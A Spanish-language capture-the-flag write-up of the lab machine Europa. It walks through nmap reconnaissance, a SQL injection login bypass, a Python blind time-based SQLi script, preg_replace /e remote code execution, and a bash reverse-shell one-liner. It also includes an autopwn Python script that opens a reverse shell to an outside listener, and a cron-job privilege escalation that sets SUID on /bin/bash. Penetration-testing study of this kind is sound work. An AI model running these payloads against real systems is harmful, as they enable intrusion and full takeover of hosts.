------
- Tags: #openssl #mysql #sqli-timebassed #preg_replace #autopwn #python-scripting #cron-job 
--------------
## Técnicas utilizadas
- SSL Certificate Inspection  
- Login Bypass - SQLI  
- SQLI (Blind Time Based) [Python Scripting]  
- Abusing preg_replace (REGEX Danger) [RCE]  
- Creating an AutoPwn script for Intrusion [Python Scripting]  
- Abusing Cron Job [Privilege Escalation]
## Procedimiento

![[Pasted image 20230816210614.png]]

#### Reconocimiento
Si lanzamos un **nmap** sobre la maquina, podemos ver los siguientes servicios con sus respectivas versiones:
```ruby
# nmap -sCV -p22,80,443 10.10.10.22 -oN Ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-17 16:54 UTC
Nmap scan report for 10.10.10.22
Host is up (0.054s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6b55420af7068c67c0e25c05db09fb78 (RSA)
|   256 b1ea5ec41c0a969e93db1dad22507475 (ECDSA)
|_  256 331f168dc024785f5bf56d7ff7b4f2e5 (ED25519)
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
| ssl-cert: Subject: commonName=europacorp.htb/organizationName=EuropaCorp Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.europacorp.htb, DNS:admin-portal.europacorp.htb
| Not valid before: 2017-04-19T09:06:22
|_Not valid after:  2027-04-17T09:06:22
| tls-alpn: 
|_  http/1.1
|_http-title: Apache2 Ubuntu Default Page: It works
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.97 seconds
```

Un escaneo con **WhatWeb** sobre la pagina web, nos muestra las siguientes tecnologías corriendo por detrás:
```ruby
# whatweb http://10.10.10.22 && whatweb http://10.10.10.22:443
http://10.10.10.22 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.22], PoweredBy[{], Script[text/javascript], Title[Apache2 Ubuntu Default Page: It works]
http://10.10.10.22:443 [400 Bad Request] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.22], Title[400 Bad Request]
```

---------------
#### SSL Certificate Inspection 
Al inspeccionar el certificado con `openssl s_client 10.10.10.10:443` podemos ver algunos **Common Names** los cuales nos pueden servir posteriormente para enumerar **Subdominios**:
![[Pasted image 20230817165741.png]]

Además, también vemos un usuario el cual nos podria servir posteriormente para loguearnos en alguna pagina.

------------
#### Login Bypass - SQLI  
La pagina web cuenta con un **Login** el cual nos pide un correo y una contraseña. Como contamos con un usuario, quizás alguna de las contraseñas basicas podria funcionar. Otra cosa que podriamos intentar, es alguna inyección **SQL** pero al intentar colocar la tipica inyección nos salta el siguiente aviso:
![[Pasted image 20230817171322.png]]

Sin embargo, podemos tirar de un **Proxy** como **BurpSuite** y directamente forzar desde aqui el uso de caracteres especiales que de antes no podiamos. Al intentar la inyeccion de antes `usuario@usuario.com' or 1=1-- -` y mandamos la petición, vemos que tampoco funciona. Podemos pasar la petición al **Repeater** para jugar con la **petición** desde aqui. Al mandar un `usuario@usuario.com' order by 4-- -` nos salta un error que nos indica que no el numero adecuado de columnas:
![[Pasted image 20230817171609.png]]

El numero correcto de columnas es cinco, si mandamos la petición con este cantidad vemos que el error desaparece:
![[Pasted image 20230817171626.png]]

Al darle click a **Follow Redirect** vemos que la respuesta del servidor es diferente, incluso se distingue un banner que de antes no veiamos, esto quiere decir, que hemos **ByPaseado** la atenticación:
![[Pasted image 20230817171651.png]]

---------
#### SQLI (Blind Time Based) [Python Scripting]  
Sabiendo que el login es vulnerable a **SQLi** podemos intentar la tipica de **Union Select** e ir enumerando la base de datos. Pero, vemos que hay un pequeño inconveniente, ningun numero de los que definimos en la consulta se muestra en la respuesta del servidor:
![[Pasted image 20230817171841.png]]

Cabe mencionar, que cuando esto sucede, podemos aprovecharnos del tiempo para ir enumerando lo que nos sea necesario. Podemos formular una consulta similar a la siguiente manera:
```
admin@europa.htb' and if(substr(database(),1,1)='a',sleep(5),1)-- -&password=pene
```

y si el primer caracter de la base de datos es **a** la web deberia tardar en responder 5 segundos aproximadamente.
Como nos podemos dar cuenta, de esta forma nos tardariamos demasiado, asi que vamos a scriptearnos algo en **Python**:
```python
from pwn import *
import signal
import pdb
import time
import urllib3
import string

# Desactiva el warning por el certificado autofirmado
urllib3.disable_warnings()

# ctrl + c
def def_handler(sig, frame):
	print("\n[!] Saliendo...")
	sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

# Variables
main_url = "https://admin-portal.europacorp.htb/login.php"
characters = string.ascii_lowercase

# Funciones
def makeSQLI()

	# Cremos una sesión, ideal para gestionar "Cookies"
	s = requests.session()
	# Para evitar el warning del certificado
	s.verify = False

	p1 = log.progress("Fuerza bruta")
	p1.status("Iniciando proceso de fuerza bruta")


	time.sleep(2)

	p2 = log.progress("Tables")

	tables = ""

	for position in range(1, 100):
		for character in characters:
	
			# Información a tramitar
			post_data = { 
				'email' : "admin@europacorp.htb' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=\"admin\" ),%d,1)='%s',sleep(5),1)-- -" % (position, character),
				'password' : 'pene'
				}

			p1.status(post_data['email'])
		
			time_start = time.time()
			r = s.post(main_url, data=post_data)
			time_end = time.time()

			if time_end - time_start > 5:
				tables += character
				p2.status(tables)
				break
			

	

# Flujo del programa
if __name__ == "__main__":

	makeSQLI()
```

---------
#### Abusing preg_replace (REGEX Danger) [RCE]  
Dentro del dashboard de administrador, vemos un apartado de nombre **Tools** en un costado izquierdo:
![[Pasted image 20230817180242.png]]

Al darle click, nos lleva a una pagina donde podemos ver la estructura basica de una **vpn**:
![[Pasted image 20230817180259.png]]

Arriba de esto, tenemos un **input** que nos indica que coloquemos una **IP**, si colocamos cualquier cosa, vemos que nuestro **input** se ve reflejado en la respuesta del servidor:
![[Pasted image 20230817180325.png]]

Para ver más a fondo como se esta tramitando esta peticón, podemos pasarla por **BurpSuite** y echarle un ojo a la estructura tramitada:
![[Pasted image 20230817180537.png]]

Algo peculiar de esta, es que hay un campo que se esta tramitando de nombre **pattern** el cual parece indicar una expresión regular a realizar en la petición. Si jugamos un poco con esta, nos damos cuenta que podemos alterar cualquier campo e incluso crear uno nuevo para que este, refleje nuestro output donde deseemos:
![[Pasted image 20230817180705.png]]

Si buscamos en google si hay manera de abusar de expresiónes regulares en PHP encontramos un [articulo](https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace) que nos indica como podriamos abusar de esto. Nos explica que podemos hacer uso de diferentes modificadores, en especial hay uno que nos llama la atencion y es el que nos permitira ejecutar comandos a nivel de sistema. Para acontecer esto, podemos enviar la siguiente data:
```
patter=/pwned/e&ipaddress=system("whoami")&text="pwned"
```

Y en la respuesta del servidor podemos ver un `wwww-data` en el siguiente campo:
![[Pasted image 20230817181121.png]]

Con la ejecución remota garantizada, solo queda hacer uso del tipico **OneLiner** para entablarnos una **RevShell**:
```
bash -c 'bash -i >& /dev/tcp/10.10.14.30/443 0>&1'
```

--------
#### Creating an AutoPwn script for Intrusion [Python Scripting]  
Todo este proceso, podemos automatizarlo con **Python** para practicar un poco de scripting con este lenguaje de programación:
```python
from pwn import *
import signal
import sys
import threading
import pdb
import urllib3
urllib3.disable_warnings()

# ctrl + c
def def_handler(sig,frame):
	print("\n[!] Saliendo...")
	sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

# Variables
login_url = "https://admin-portal.europacorp.htb/login.php"
rce_url = "https://admin-portal.europacorp.htb/tools.php"
lport = 443

# Funciones
def makeRequest():

	s = requests.session()
	s.verify = False
	
	post_data = {
		'email' : "admin@europacorp.htb' union select 1,2,3,4,5-- -",
		'password' : "#"
	}

	r = s.post(login_url, data=post_data)

	post_data = {
		'pattern' : '/pwned/e',
		'ipaddress' : """system("bash -c 'bash -i >& /dev/tcp/10.10.14.30/443 0>&1'")""",
		'text' : 'pwned'
	}

	r = s.post(rce_url, data=post_data)


# Flujo del programa
if __name__ == "__main__":

	try:
		threading.Thread(target=makeRequest, args=()).start()
	except Exception as e:
		log.error(str(e))


	shell = listen(lport, timeout=20).wait_for_connection()
	shell.interactive()
```

--------------
#### Abusing Cron Job [Privilege Escalation]
Una vez dentro de la maquina, podemos listar por tareas **Cron** desde el archivo de configuración **/etc/crontab** y nos percatamos de que existe una tarea existente:
```php
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * *	root	/var/www/cronjobs/clearlogs
```

Basicamente esta ejecutando un script en **PHP**, es el siguiente:
```php
#!/usr/bin/php
<?php
$file = '/var/www/admin/logs/access.log';
file_put_contents($file, '');
exec('/var/www/cmd/logcleared.sh');
?>
```

Como vemos, en el script se esta utilizando la funcion **exec(..)** para ejecutar un script en **bash** el cual, de primeras, no existe. Podemos crear el archivo y asignar un comando malicioso para que le otorge **SUID** a la bash:
```
#!/bin/bash
chmod u+s /bin/bash
```

Y solo tendriamos que esperar que se ejecute la tarea para que la **bash** cuente con este privilegio:
```
Bash SUID
```



